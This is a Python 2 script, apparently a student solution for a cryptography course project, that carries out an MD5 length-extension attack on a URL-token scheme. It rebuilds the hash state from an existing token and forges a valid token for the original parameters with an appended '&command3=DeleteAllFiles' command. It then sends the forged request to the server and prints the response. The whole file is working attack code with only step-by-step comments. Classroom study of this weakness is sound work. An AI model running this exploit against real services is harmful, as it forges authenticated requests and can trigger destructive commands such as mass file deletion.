# Authors: Nicolas Carson && Nic Williams
# ECEN 5032 Project 1 - Attacking Cryptographic Hashes
# 
import httplib, urlparse, sys, urllib

from pymd5 import md5, padding
#
# Take URL from command line
#
url = sys.argv[1]
#
# What we want the extension to execute
#
exploit_command = "&command3=DeleteAllFiles"
#
# Getting old token from URL
#
parsed_url = urlparse.urlsplit(url)

#splits URL into commands/user/token/etc.
arguments = parsed_url.query.split("&")

#defines everything around the token
prefix = parsed_url.scheme + "://" + parsed_url.netloc + parsed_url.path

# going to define number of blocks based off URL size
message_length = 8 + len("&".join(arguments[1:]))

# extract token from URL
token = (arguments[0])[6:]
#
# Creating new token with md5
#
# finding size of message
padded_message_length = (message_length + len(padding(message_length * 8))) * 8

# decoding the md5 hash to get the token
h = md5(state = token.decode("hex"), count = padded_message_length)

# new token generates with exploit command in it
h.update(exploit_command)
#
# Using new token for exploit
#
# taking old url arguments
arguments[0] = (arguments[0])[0:6] + h.hexdigest()

# piecing old arguments together
new_arguments = "&".join(arguments)

# new exploit URL made
url = prefix + "?" + new_arguments + urllib.quote(padding (message_length * 8)) + exploit_command

#
# Send to server and receive response
#

parsed_url = urlparse.urlparse(url)
conn = httplib.HTTPConnection(parsed_url.hostname)
conn.request("GET", parsed_url.path + "?" + parsed_url.query)
print conn.getresponse().read()
#
#
#
